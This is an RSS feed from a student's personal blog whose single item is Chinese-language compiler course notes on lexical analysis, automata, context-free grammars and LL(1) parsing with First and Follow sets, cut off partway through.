<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Cubic Y³</title>
        <link>http://cubicy.icu</link>
        <description>Notes, CTF, DIY, thoughts and waifus.

I&#39;m CubicYYY, an undergraduate student majoring in Computer Science at Zhejiang University.
Learning: Electric guitar
❤❤❤ CTF, toy projects, anime
✖✖✖ Technological supremacy
Resume is [here](https://latexonline.cc/compile?git=https://github.com/cubicYYY/resume&amp;target=resume.tex&amp;command=xelatex).</description>
        <language>zh-CN</language>
        <pubDate>Sun, 14 Apr 2024 01:10:20 +0800</pubDate>
        <lastBuildDate>Sun, 14 Apr 2024 01:10:20 +0800</lastBuildDate>
        <category>CISCN</category>
        <category>web</category>
        <category>Write-Up</category>
        <category>Misc</category>
        <category>出题</category>
        <category>Hackergame</category>
        <category>SchoolBus</category>
        <category>冰菓</category>
        <category>古籍研究社</category>
        <category>Rust</category>
        <category>Lifetime</category>
        <category>Code</category>
        <category>Programming</category>
        <category>Treap</category>
        <category>图论</category>
        <category>Kruskal</category>
        <category>BST</category>
        <category>Stack</category>
        <category>Splay</category>
        <category>数链剖分</category>
        <category>分块</category>
        <category>哈希</category>
        <category>树状数组</category>
        <category>LCA</category>
        <category>持久化</category>
        <category>线段树</category>
        <category>Compiler</category>
        <category>Computer Science</category>
        <category>On Going</category>
        <category>Phar</category>
        <category>反序列化</category>
        <category>PHP</category>
        <category>NLP</category>
        <category>Fuzzing</category>
        <category>AFL</category>
        <category>Math</category>
        <category>Translation</category>
        <category>Yoneda Lemma</category>
        <category>Miscellaneous</category>
        <item>
            <guid isPermalink="true">http://cubicy.icu/compiler-construction-principles/</guid>
            <title>编译原理课程笔记</title>
            <link>http://cubicy.icu/compiler-construction-principles/</link>
            <category>Compiler</category>
            <category>Computer Science</category>
            <category>On Going</category>
            <pubDate>Sun, 14 Apr 2024 01:10:20 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;编译原理&#34;&gt;&lt;a href=&#34;#编译原理&#34; class=&#34;headerlink&#34; title=&#34;编译原理&#34;&gt;&lt;/a&gt;编译原理&lt;/h1&gt;&lt;p&gt;以&lt;strong&gt;快速复习&lt;/strong&gt;为目的。&lt;br&gt;文中部分图片与文字来自于姚老师(ZJU, pyaoaa at zju.edu.cn)&lt;/p&gt;
&lt;h2 id=&#34;Part-0-课程信息&#34;&gt;&lt;a href=&#34;#Part-0-课程信息&#34; class=&#34;headerlink&#34; title=&#34;Part 0: 课程信息&#34;&gt;&lt;/a&gt;Part 0: 课程信息&lt;/h2&gt;&lt;p&gt;使用教材：&lt;em&gt;Modern Compiler Implementation in C&lt;/em&gt;, Andrew W. Appel （A.K.A 虎书）&lt;/p&gt;
&lt;p&gt;相关课程：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://web.stanford.edu/class/cs143/&#34;&gt;Stanford课程主页&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/6035/sp21&#34;&gt;MIT课程主页&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://inst.eecs.berkeley.edu/~cs164/fa21/&#34;&gt;UCBerkeley课程主页&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;分数构成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;课程作业(课后小型练习题) &amp;#x3D; 10%&lt;/li&gt;
&lt;li&gt;随堂测验&amp;#x3D; 10%&lt;/li&gt;
&lt;li&gt;期中考试&amp;#x3D; 15%&lt;/li&gt;
&lt;li&gt;综合性课程设计&amp;#x3D; 25%&lt;/li&gt;
&lt;li&gt;期末考试&amp;#x3D; 40% （斩杀线40&amp;#x2F;100）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;前置知识：计算理论（笔记参考&lt;a href=&#34;https://note.tonycrane.cc/cs/tcs/toc/&#34;&gt;https://note.tonycrane.cc/cs/tcs/toc/&lt;/a&gt;）&lt;/p&gt;
&lt;h2 id=&#34;Part-1-简介&#34;&gt;&lt;a href=&#34;#Part-1-简介&#34; class=&#34;headerlink&#34; title=&#34;Part 1: 简介&#34;&gt;&lt;/a&gt;Part 1: 简介&lt;/h2&gt;&lt;p&gt;基本概念：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;中间代码&amp;#x3D;Intermediate Code&lt;/li&gt;
&lt;li&gt;词法分析&amp;#x3D;Lexing&amp;#x2F;Scanning&amp;#x2F;LexicalAnalysis&lt;/li&gt;
&lt;li&gt;语法分析&amp;#x3D;Parsing&amp;#x2F;SyntaxAnalysis&lt;/li&gt;
&lt;li&gt;中间表示&amp;#x3D;IR&amp;#x3D;Intermediate Representation&lt;/li&gt;
&lt;li&gt;树型中间表示&amp;#x3D;IR Tree&lt;/li&gt;
&lt;li&gt;前端，后端&lt;br&gt;略。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;Part-2-词法分析&#34;&gt;&lt;a href=&#34;#Part-2-词法分析&#34; class=&#34;headerlink&#34; title=&#34;Part 2: 词法分析&#34;&gt;&lt;/a&gt;Part 2: 词法分析&lt;/h2&gt;&lt;h3 id=&#34;词法分析概述&#34;&gt;&lt;a href=&#34;#词法分析概述&#34; class=&#34;headerlink&#34; title=&#34;词法分析概述&#34;&gt;&lt;/a&gt;词法分析概述&lt;/h3&gt;&lt;p&gt;将输入字符串识别为有意义的子串。（把基本单元划分好）&lt;br&gt;(Token单词, Lexeme词素(可选)) e.g. (IF, ) (ELSE, ) (BINARY_OP, &amp;gt;&amp;#x3D;) (UNARY_OP, &amp;amp;)&lt;/p&gt;
&lt;h3 id=&#34;正则表达式&#34;&gt;&lt;a href=&#34;#正则表达式&#34; class=&#34;headerlink&#34; title=&#34;正则表达式&#34;&gt;&lt;/a&gt;正则表达式&lt;/h3&gt;&lt;p&gt;Regex Expression &amp;#x3D; RE&lt;br&gt;运算：连接concatenation + 幂Power&lt;br&gt;e.g.: $ ab(a|b)^3c^* $&lt;br&gt;下略。&lt;/p&gt;
&lt;h3 id=&#34;有穷自动机&#34;&gt;&lt;a href=&#34;#有穷自动机&#34; class=&#34;headerlink&#34; title=&#34;有穷自动机&#34;&gt;&lt;/a&gt;有穷自动机&lt;/h3&gt;&lt;p&gt;相关概念：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;NFA&amp;#x2F;DFA：略&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;子集构造法subsetconstruction(NFA-&amp;gt;DFA)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DFA的每个状态是NFA的状态集合的一个子集&lt;/li&gt;
&lt;li&gt;读了输入ai后NFA能到达的所有状态：s1,s2,…,sk，则DFA到达一个状态，对应于NFA的{s1,s2,…,sk}&lt;/li&gt;
&lt;li&gt;NFA状态(集)上的一些操作定义&lt;ul&gt;
&lt;li&gt;ε-closure(s):&amp;#x3D; NFA状态s的ε-闭包&amp;#x3D;s经ε转换所能到达的状态集合&lt;/li&gt;
&lt;li&gt;ε-closure(T):&amp;#x3D; T中所有状态的ε-闭包的并集,即 $ \cup_{s\in T}{\epsilon-closure(s)} $&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;过程&lt;ol&gt;
&lt;li&gt;NFA的初始状态S的ε-闭包对应于DFA的初始状态&lt;/li&gt;
&lt;li&gt;针对每个DFA状态(对应NFA状态子集A)，求输入每个可能输入ai后能到达的NFA状态的ε-闭包并集（NFA从状态集A出发，读入ai后能到达的状态集合） $$ S&amp;#x3D;\epsilon-closure(move(A,a_i)) $$&lt;/li&gt;
&lt;li&gt;该集合S要么对应于DFA中的一个已有状态，要么令其成为一个新加的DFA状态&lt;/li&gt;
&lt;li&gt;重复上述两步，逐步构造DFA的状态转换表（每个状态集合S与每个输入ai），直到不动点（不再新增状态，且状态转移表完全求出，即对任一状态集合S已知分别接受所有输入ai将分别转移到何状态）&lt;/li&gt;
&lt;li&gt;在DFA中，只要状态集合S包含至少一个原来NFA中的终止状态，就把S标记为终止状态&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;示例（TODO）&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;/compiler-construction-principles/nfa2dfa.png&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Thumpson构造法(RE-&amp;gt;NFA)：略&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;词法分析器自动生成&#34;&gt;&lt;a href=&#34;#词法分析器自动生成&#34; class=&#34;headerlink&#34; title=&#34;词法分析器自动生成&#34;&gt;&lt;/a&gt;词法分析器自动生成&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;DFA最小化（-&amp;gt;状态最小的DFA，在同构意义下唯一）&lt;/li&gt;
&lt;li&gt;可区分状态：存在串s使其分别从状态s、t出发，一个接受串s，一个拒绝串s，则s与t可区分&lt;/li&gt;
&lt;li&gt;步骤：&lt;ol&gt;
&lt;li&gt;初始等价类，仅由接受状态集合和非接受状态两个集合构成&lt;/li&gt;
&lt;li&gt;用所有可能的输入ai应用于各个集合（走一步）&lt;ul&gt;
&lt;li&gt;只有集合G的每个状态读入同一字符后，都落入（包含在）相同的某个集合，该集合G在这一步才不用细分&lt;/li&gt;
&lt;li&gt;否则集合G要被细分：落入不同集合的对应状态需要被分割进不同集合&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不断重复2直到不动点（任一集合分别对所有输入ai都不可细分）&lt;/li&gt;
&lt;li&gt;此时等价类中的每个集合即对应最小DFA的一个状态。在其上可以轻松构建min-DFA，该过程是trivial的（可以每个组中选择一个状态作代表）。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;示例（TODO）&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;/compiler-construction-principles/DFA-simplify-diverge.png&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;/compiler-construction-principles/DFA-simplify.png&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;Lex工具&#34;&gt;&lt;a href=&#34;#Lex工具&#34; class=&#34;headerlink&#34; title=&#34;Lex工具&#34;&gt;&lt;/a&gt;Lex工具&lt;/h3&gt;&lt;p&gt;通常和Yacc一起使用，生成编译器的前端。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;声明部分&lt;ul&gt;
&lt;li&gt;常量：常数标识符&lt;/li&gt;
&lt;li&gt;正则规则定义&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;转换规则模式{动作}&lt;ul&gt;
&lt;li&gt;模式&amp;#x3D;正则表达式&lt;/li&gt;
&lt;li&gt;动作&amp;#x3D;识别到相应模式时应调用的处理函数（一般以C语言代码表示）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;辅助函数：动作中使用的函数&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;解决冲突：最长匹配，较前规则优先&lt;/p&gt;
&lt;h2 id=&#34;Part-3-语法分析-CFG-Parsing&#34;&gt;&lt;a href=&#34;#Part-3-语法分析-CFG-Parsing&#34; class=&#34;headerlink&#34; title=&#34;Part 3: 语法分析 - CFG &amp;amp; Parsing&#34;&gt;&lt;/a&gt;Part 3: 语法分析 - CFG &amp;amp; Parsing&lt;/h2&gt;&lt;h3 id=&#34;语法分析器概述&#34;&gt;&lt;a href=&#34;#语法分析器概述&#34; class=&#34;headerlink&#34; title=&#34;语法分析器概述&#34;&gt;&lt;/a&gt;语法分析器概述&lt;/h3&gt;&lt;p&gt;从词法分析器获得Token序列，确认该序列是否可以由语言的文法生成&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对于语法错误的程序，报告错误信息&lt;/li&gt;
&lt;li&gt;对于语法正确的程序，生成语法分析树(简称语法树) e.g. 抽象语法树AST&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;实现：手动 or 自动(使用Parse generator&amp;#x3D;{Yacc, Bison, ANTLR, mehir…})&lt;/p&gt;
&lt;h3 id=&#34;上下文无关文法CFG&#34;&gt;&lt;a href=&#34;#上下文无关文法CFG&#34; class=&#34;headerlink&#34; title=&#34;上下文无关文法CFG&#34;&gt;&lt;/a&gt;上下文无关文法CFG&lt;/h3&gt;&lt;p&gt;CFG &amp;#x3D; Context Free Language&lt;/p&gt;
&lt;p&gt;$$ G&amp;#x3D;(T,N,P,S) $$&lt;br&gt;T：终结符集合(Terminals)&lt;br&gt;N：非终结符集合(Non-terminals)&lt;br&gt;P：产生式集合(Productions) $ A\rightarrow a, A \in N, a \in (T \cup N)^*$&lt;br&gt;S：开始符号(Startsymbol): $ S \in N $&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;📕“上下文无关”体现在：产生式左侧只有一个非终结符，因此类似 $xAy\rightarrow xay$这样，需要关心符号前后别的符号是什么才能应用的产生式是不能在CFG里的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;特殊符号：$ &amp;#x3D;end of file(EOF)&lt;br&gt;添加一个新符号S’与一条新规则以表明必须在尾部：&lt;ul&gt;
&lt;li&gt;$ S’ \rightarrow S$ $&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;产生式缩写：左侧一样的产生式可以把右侧使用”|”合并。例如 $E\rightarrow E+E|(E)|id$&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;推导Derivation和规约Reduction&#34;&gt;&lt;a href=&#34;#推导Derivation和规约Reduction&#34; class=&#34;headerlink&#34; title=&#34;推导Derivation和规约Reduction&#34;&gt;&lt;/a&gt;推导Derivation和规约Reduction&lt;/h3&gt;&lt;p&gt;例如有产生式 $A\rightarrow \gamma$，我们可以有 $\alpha A \beta \Rightarrow \alpha \gamma \beta$&lt;br&gt;那么我们说：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$\alpha A \beta $ &lt;strong&gt;直接推导&lt;/strong&gt;到 $ \alpha \gamma \beta$&lt;/li&gt;
&lt;li&gt;$\alpha \gamma \beta $ &lt;strong&gt;直接规约&lt;/strong&gt;到 $  \alpha A \beta$&lt;br&gt;不言而喻的&lt;strong&gt;多步推导记号&lt;/strong&gt;：$\Rightarrow^5$ $\Rightarrow^+$ $\Rightarrow^*$&lt;br&gt;分别代表五步推导，至少一步推导，0次或更多次推导&lt;/li&gt;
&lt;li&gt;推导&amp;#x3D;从文法生成语言里的句子，规约&amp;#x3D;识别句子成分并逐渐规约到开始符号&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;最左推导Left-most-Derivation&#34;&gt;&lt;a href=&#34;#最左推导Left-most-Derivation&#34; class=&#34;headerlink&#34; title=&#34;最左推导Left-most Derivation&#34;&gt;&lt;/a&gt;最左推导Left-most Derivation&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;最左推导&amp;#x3D;每步代换最左边的非终结符。逆过程为最右规约&lt;/li&gt;
&lt;li&gt;类比可得出最右推导、最左规约的定义&lt;/li&gt;
&lt;li&gt;在自顶向下的分析中，总是采用&lt;strong&gt;最左推导&lt;/strong&gt;；在自底向上的分析中，总是采用&lt;strong&gt;最左归约&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;/compiler-construction-principles/lmrm.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;句型-Sentential-form-句子-Sentence-语言-Language&#34;&gt;&lt;a href=&#34;#句型-Sentential-form-句子-Sentence-语言-Language&#34; class=&#34;headerlink&#34; title=&#34;句型(Sentential form) 句子(Sentence) 语言(Language)&#34;&gt;&lt;/a&gt;句型(Sentential form) 句子(Sentence) 语言(Language)&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;句型 &amp;#x3D; 文法G下可能推导出的一个符号序列：可能包含终结符&amp;#x2F;非终结符，可为空&lt;/li&gt;
&lt;li&gt;句子 &amp;#x3D; 不含非终结符的句型（仅含终结符）&lt;/li&gt;
&lt;li&gt;语言 &amp;#x3D; 文法G可产生的所有句子的集合&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;正则文法-RE-与-上下文无关文法-CFG&#34;&gt;&lt;a href=&#34;#正则文法-RE-与-上下文无关文法-CFG&#34; class=&#34;headerlink&#34; title=&#34;正则文法(RE) 与 上下文无关文法(CFG)&#34;&gt;&lt;/a&gt;正则文法(RE) 与 上下文无关文法(CFG)&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;上下文无关语言L(G) :&amp;#x3D; CFG产生的所有句子的集合&lt;/li&gt;
&lt;li&gt;正则语言L(r) :&amp;#x3D; RE产生的所有句子的集合&lt;ul&gt;
&lt;li&gt;RE &amp;#x3D; Regex Expression &amp;#x3D; 正则表达式&lt;/li&gt;
&lt;li&gt;正则表达式r定义正则语言L(r)&lt;/li&gt;
&lt;li&gt;$ L(r) \in L(G) $：因为正则对产生式限制更大，必须为( $A,B \in N, a \in T\cup {\epsilon} $ )：&lt;ul&gt;
&lt;li&gt;左线性文法：形如 $A\rightarrow aB$ 或 $A\rightarrow a$&lt;/li&gt;
&lt;li&gt;右线性文法：形如 $A\rightarrow Ba$ 或 $A\rightarrow a$&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;正则语言可用于词法分析，上下文无关语言可用于语法分析（语言描述能力、复杂性决定的）&lt;/li&gt;
&lt;li&gt;Chomsky（计算理论课程内容）: &lt;ul&gt;
&lt;li&gt;0型文法&amp;#x3D;短语结构文法 递归可枚举&lt;/li&gt;
&lt;li&gt;1型文法&amp;#x3D;上下文有关文法&lt;/li&gt;
&lt;li&gt;2型文法&amp;#x3D;CFG&lt;/li&gt;
&lt;li&gt;3型文法&amp;#x3D;RE&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;CFG的分析树Parse-Tree&#34;&gt;&lt;a href=&#34;#CFG的分析树Parse-Tree&#34; class=&#34;headerlink&#34; title=&#34;CFG的分析树Parse Tree&#34;&gt;&lt;/a&gt;CFG的分析树Parse Tree&lt;/h3&gt;&lt;p&gt;分析树性质&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;根节点&amp;#x3D;文法初始符号&lt;/li&gt;
&lt;li&gt;叶节点&amp;#x3D;终结符&lt;/li&gt;
&lt;li&gt;内部节点&amp;#x3D;非终结符&lt;/li&gt;
&lt;li&gt;父节点→{叶节点}&amp;#x3D;产生式&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;语法分析-Parsing-中的挑战&#34;&gt;&lt;a href=&#34;#语法分析-Parsing-中的挑战&#34; class=&#34;headerlink&#34; title=&#34;语法分析(Parsing)中的挑战&#34;&gt;&lt;/a&gt;语法分析(Parsing)中的挑战&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;核心目标：对于终结符号串x，要么从S推导出x，要么设法将x规约到S&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自顶向下(Top-down) S-&amp;gt;x, 从&lt;strong&gt;根节点&lt;/strong&gt;开始构造Parse Tree&lt;/li&gt;
&lt;li&gt;自底向上(Bottom-up) x-&amp;gt;S, 从&lt;strong&gt;叶节点&lt;/strong&gt;开始构造Parse Tree&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;作为搜索问题：搜索空间大-&amp;gt;空间大小受文法产生式限制&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;无限制：时间复杂度 $O(n^3)$&lt;/li&gt;
&lt;li&gt;上下文无关语言CFL 的子集需要的典型时间为 $O(n)$，例如&lt;ul&gt;
&lt;li&gt;Predictive parsing using LL(1) grammars&lt;/li&gt;
&lt;li&gt;Shift-Reduce parsing using LR(1) grammars&lt;/li&gt;
&lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;编程语言的文法设计&#34;&gt;&lt;a href=&#34;#编程语言的文法设计&#34; class=&#34;headerlink&#34; title=&#34;编程语言的文法设计&#34;&gt;&lt;/a&gt;编程语言的文法设计&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;核心：无二义性&lt;/strong&gt;&lt;br&gt;二义性来源：某些句子存在不止一棵分析树&amp;#x3D;有两个不同的最左推导&amp;#x3D;&lt;strong&gt;多种可选推导处于文法同一层&lt;/strong&gt;&lt;br&gt;例如：$$E \Rightarrow E*E \Rightarrow id*E \Rightarrow id*E+E$$ 与 $$E \Rightarrow E+E \Rightarrow E*E+E \Rightarrow id*E+E $$&lt;br&gt;对于”3*4+5”，前者给出3*(4+5)&amp;#x3D;27（错误），后者给出3*4+5&amp;#x3D;17（正确）。&lt;/p&gt;
&lt;p&gt;解决办法：确保只有一种最左推导&amp;#x3D;将同一层文法分层&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;规定符号优先级（”*“” &amp;gt; “+”,”-“）&lt;ul&gt;
&lt;li&gt;越接近开始符号S的文法符号优先级越低&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;规定符号结合性（左结合&amp;#x2F;右结合）&lt;ul&gt;
&lt;li&gt;递归非终结符（也就是这个终结符在产生式左部右部都出现）在终结符（也就是这个运算符，比如&lt;code&gt;*&lt;/code&gt;,&lt;code&gt;+&lt;/code&gt;）左边，运算就左结合&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;/compiler-construction-principles/priority.png&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;判定CFG二义性：不可判定问题&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;但可以通过给定充分条件（无二义文法）确保无二义性&lt;ul&gt;
&lt;li&gt;自顶向下：LL(1)&lt;/li&gt;
&lt;li&gt;自底向上：LR(1), LALR(1)&lt;br&gt;&lt;a name=&#34;grammars-set&#34;&gt;&lt;/a&gt;&lt;br&gt;&lt;img src=&#34;/compiler-construction-principles/grammars.png&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;Part-4-语法分析-自顶向下&#34;&gt;&lt;a href=&#34;#Part-4-语法分析-自顶向下&#34; class=&#34;headerlink&#34; title=&#34;Part 4: 语法分析 - 自顶向下&#34;&gt;&lt;/a&gt;Part 4: 语法分析 - 自顶向下&lt;/h2&gt;&lt;p&gt;自顶向下每一步的推导都需要做出&lt;strong&gt;两个选择&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;替换哪个非终结符？&lt;/li&gt;
&lt;li&gt;应用哪个（左侧为该终结符的）产生式替换？&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通用形式：&lt;strong&gt;递归下降分析(Recursive-Descent Parsing)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;发生错误（没有产生式可以产生合法的子节点）就回溯&lt;/li&gt;
&lt;li&gt;问题：太慢！&lt;/li&gt;
&lt;li&gt;该过程类似NFA，能否构造类似DFA的分析方法？&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;LL-1-和预测分析法&#34;&gt;&lt;a href=&#34;#LL-1-和预测分析法&#34; class=&#34;headerlink&#34; title=&#34;LL(1)和预测分析法&#34;&gt;&lt;/a&gt;LL(1)和预测分析法&lt;/h3&gt;&lt;p&gt;预测分析法(Predictive parsing)：接受LL(k)文法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一个L: “left to right” 从左到右扫描&lt;/li&gt;
&lt;li&gt;第二个L: “left-most derivation” 最左推导&lt;/li&gt;
&lt;li&gt;k: 向前看k个token确定推导选用的产生式（一般k&amp;#x3D;1）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;接下来需要添加约束使其无需回溯。我们先引入几个概念：&lt;/p&gt;
&lt;h4 id=&#34;First集和Follow集&#34;&gt;&lt;a href=&#34;#First集和Follow集&#34; class=&#34;headerlink&#34; title=&#34;First集和Follow集&#34;&gt;&lt;/a&gt;First集和Follow集&lt;/h4&gt;&lt;p&gt;给定 $ G&amp;#x3D;(T,N,P,S),\alpha \in (T\cup N)^* $&lt;br&gt;&lt;strong&gt;记空串为$\epsilon$&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;First集：可从$\alpha$推导得到的串的首个终结符的集合（也就是说，$\alpha$自己推导出的第一个终结符可能是什么）&lt;br&gt;$$ \text{First}(\alpha)&amp;#x3D;{a| \alpha \Rightarrow^*a…\ ,a\in T} $$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Follow集：从S出发，可能在推导过程中跟在A右边的终结符号集&lt;br&gt;$$ \text{Follow}(A)&amp;#x3D;{a|S\Rightarrow^*…Aa…\ ,a\in T} $$&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;例如:S→αAaβ，终结符号 $ a\in \text{Follow}(A) $&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们至此可以使用两个条件保证产生式的选择是唯一的：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;$ \text{First}(\alpha)\cap \text{First}(\beta)&amp;#x3D; \emptyset $ （α和β推导不出以同一个单词为首的串）&lt;ul&gt;
&lt;li&gt;意义：显然的。这样看终结符是哪个就知道应该用哪个产生式。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;若$\beta \Rightarrow^* \epsilon$，那么$\alpha \nRightarrow^* \epsilon$，且 $ \text{First}(\alpha) \cap Follow(A) &amp;#x3D; \emptyset $ （α和β不能同时推出$\epsilon$;First(α)不应在Follow(A) 中）&lt;ul&gt;
&lt;li&gt;意义：其实就是考虑如果有空串时，最后终结符因为空串没了则转而考虑Follow集以实现再向后看一个的效果。假设下一个输入是b,且$\beta \Rightarrow^* \epsilon$&lt;ul&gt;
&lt;li&gt;如果b∈First(α)，则选择A → α(属于上面1的情况)&lt;/li&gt;
&lt;li&gt;如果b∈Follow(A)，则选择A → β ,因为A最终到达了$\epsilon$，而后面紧跟着b&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;接下来我们会看到具体的实现方式以实现LL(1)预测分析。三步走：计算First,Follow-&amp;gt;构造预测分析表-&amp;gt;预测分析&lt;/p&gt;
&lt;h4 id=&#34;第一步：计算First-Follow&#34;&gt;&lt;a href=&#34;#第一步：计算First-Follow&#34; class=&#34;headerlink&#34; title=&#34;第一步：计算First, Follow&#34;&gt;&lt;/a&gt;第一步：计算First, Follow&lt;/h4&gt;&lt;h5 id=&#34;Nullable集&#34;&gt;&lt;a href=&#34;#Nullable集&#34; class=&#34;headerlink&#34; title=&#34;Nullable集&#34;&gt;&lt;/a&gt;Nullable集&lt;/h5&gt;&lt;p&gt;由于刚刚提到了空串，我们需要引入一个简单的新定义：Nullable集&amp;#x3D;{可推导出空串的符号}。&lt;br&gt;定义是递归的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Base Case: 如果有产生式 $ X\rightarrow \epsilon$, 那么X当然是Nullable的&lt;/li&gt;
&lt;li&gt;Inductive Case: 如果有产生式 $ X\rightarrow Y_1 Y_2 Y_3 … Y_n$, 且 $Y_1,Y_2,Y_3,…,Y_n$&lt;strong&gt;每个都能&lt;/strong&gt;推导出空串，则X是Nullable的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对于每个产生式，我们可以循环用它们不断更新Nullable集直到不动点。这同样适用于First集与Follow集。&lt;/p&gt;
&lt;p&gt;First集：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Base Case: 如果X是终结符terminal: First(X)&amp;#x3D;{X}&lt;/li&gt;
&lt;li&gt;Inductive Case: 如果有产生式 $ X\rightarrow Y_1 Y_2 Y_3 … Y_n$&lt;ul&gt;
&lt;li&gt;$\text{First}(X) \cup &amp;#x3D; \text{First}(Y_1)$ ($ a\cup &amp;#x3D; b$意为$ a \leftarrow a\cup b$)&lt;/li&gt;
&lt;li&gt;如果$Y_1 \in \text{Nullable}: $$\text{First}(X) \cup &amp;#x3D; \text{First}(Y_1)$&lt;/li&gt;
&lt;li&gt;如果$Y_1,Y_2 \in \text{Nullable}: $$\text{First}(X) \cup &amp;#x3D; \text{First}(Y_2)$&lt;/li&gt;
&lt;li&gt;…&lt;/li&gt;
&lt;li&gt;直到某个$Y_i \notin \text{Nullable}$则停止&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对于每个产生式，我们可以循环用它们不断更新First集直到不动点。&lt;/p&gt;
&lt;p&gt;Follow集：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Base Case: $ \text{Follow}(A)&amp;#x3D;\emptyset $&lt;/li&gt;
&lt;li&gt;Inductive Case: 如果有产生式 $ B\rightarrow s_1 A\ s_2 $&lt;ul&gt;
&lt;li&gt;$\text{Follow}(A) \cup &amp;#x3D; \text{First}(s_2)$&lt;/li&gt;
&lt;li&gt;如果$s_2 \in \text{Nullable}$, $\text{Follow}(A) \cup &amp;#x3D; \text{Follow}(B)$&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
